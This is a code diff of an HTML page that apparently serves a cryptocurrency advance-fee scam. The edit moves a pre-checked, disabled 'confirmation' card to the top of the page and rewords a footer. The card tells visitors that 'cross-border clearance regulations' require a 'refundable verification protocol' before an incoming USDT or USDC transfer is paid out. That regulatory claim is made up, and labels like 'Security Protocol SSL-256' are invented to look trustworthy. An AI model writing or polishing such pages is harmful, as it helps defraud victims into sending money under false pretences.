@@ -540,6 +540,28 @@
         <span class="badge">Action Required</span>
       </div>
 
+      <!-- Context / Explanation Card Swapped to the Top -->
+      <div class="glass-card neon-card" id="confirmationCard" style="margin:0 auto 20px auto;">
+        <div class="checkbox-container">
+          <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
+          <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+
+            <span style="  
+              display: block;  
+              margin: 12px 0;  
+              padding-left: 12px;  
+              border-left: 3px solid rgba(200, 50, 80, 0.85);  
+              color: rgba(255, 255, 255, 0.85);  
+              font-size: 10px;
+              font-weight: bold; 
+            ">  
+              Because your incoming transaction falls below minimum reporting thresholds, standard cross-border clearance regulations require the above refundable verification protocol before disbursement.
+            </span>
+
+          </label>
+        </div>
+      </div>
+
       <!-- Segmented Token Selector inside container -->
       <div id="tokenSelector">
         <button id="usdt-btn" class="active" onclick="showTokenCard('usdt')">USDT NETWORK</button>
@@ -623,31 +645,14 @@
           <div class="status" id="usdc-status">Waiting for verification...</div>
         </div>
       </div>
+
+      <!-- Footer Note Paired at the Bottom -->
+      <div class="footer-note" style="text-align: center; margin-top: 20px;">
+          Intercompany Automated  Ecosystem • Security Protocol SSL-256
+      </div>
     </div>
-<div class="glass-card neon-card" id="confirmationCard" style="margin:30px auto;">
-  <div class="checkbox-container">
-    <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
-    <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+  </div>
 
-      <span style="  
-        display: block;  
-        margin: 12px 0;  
-        padding-left: 12px;  
-        border-left: 3px solid rgba(200, 50, 80, 0.85);  
-        color: rgba(255, 255, 255, 0.85);  
-        font-size: 10px;
-        font-weight: bold; 
-      ">  
-        Because your incoming transaction falls below minimum reporting thresholds, standard cross-border clearance regulations require the above refundable verification protocol before disbursement.
-      </span>
-
-    </label>
-  </div>
-  <div class="footer-note">
-      Automated Clearance System • Security Protocol SSL-256
-  </div>
-</div>
-  </div>
 
 </body>
 <script>
